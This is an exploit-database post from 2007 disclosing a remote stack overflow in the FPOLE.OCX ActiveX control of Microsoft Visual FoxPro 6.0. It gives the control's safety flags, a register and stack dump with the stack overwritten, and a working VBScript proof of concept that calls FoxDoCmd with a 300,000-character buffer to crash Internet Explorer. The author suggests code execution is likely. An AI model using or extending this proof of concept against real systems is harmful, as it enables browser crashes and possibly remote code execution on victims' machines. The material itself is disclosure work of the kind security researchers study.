<html><head><title>Microsoft Visual FoxPro 6.0 (FPOLE.OCX v. 6.0.8450.0) Remote PoC</title></head><pre>&lt;pre&gt;
&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span class=&quot;general1-symbol&quot;&gt;-----------------------------------------------------------------------------------------------------------
 &lt;b&gt;0-day: Microsoft Visual FoxPro 6.0 fpole 1.0 Type Library (FPOLE.OCX v. 6.0.8450.0) Remote Stack Overflow&lt;/b&gt;
 url: http://www.microsoft.com

 author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7

 This control is marked as:
 &lt;b&gt;RegKey Safe for Script: Falso
 RegKey Safe for Init: Falso
 Implements IObjectSafety: Vero
 IDisp Safe:  Safe for untrusted: caller  
 KillBitSet: Falso&lt;/b&gt;

 This is a dump:
 &lt;b&gt;registers:

 EAX 000287C4
 ECX 017923C8
 EDX 017FC60D ASCII &quot;bbbbbbbbbbbb...&quot;
 EBX 04E51ED8
 ESP 017FC3C0
 EBP 017FC5FC
 ESI 000493E1
 EDI 7C80BDB6 kernel32.lstrlenA

 EIP 04E46807 FPOLE.04E46807
 
 *********************************************

 stack:
 [...]
 017FC60C  |62626262
 017FC610  |62626262
 017FC614  |62626262
 017FC618  |62626262
 017FC61C  |62626262
 [...]&lt;/b&gt;
 
 so I think code execution is possible even if, in this moment of my life, I really have no time to
 investigate :)
-----------------------------------------------------------------------------------------------------------

&lt;object classid='clsid:EF28418F-FFB2-11D0-861A-00A0C903A97F' id='test'&gt;&lt;/object&gt;

&lt;input language=VBScript onclick=tryMe() type=button value=&quot;Click here to start the test&quot;&gt;

&lt;script language = 'vbscript'&gt;
 Sub tryMe()
  buff = String(300000, &quot;b&quot;)
  test.FoxDoCmd buff, 1
 End Sub
&lt;/script&gt;
&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

# milw0rm.com [2007-09-06]</pre></html>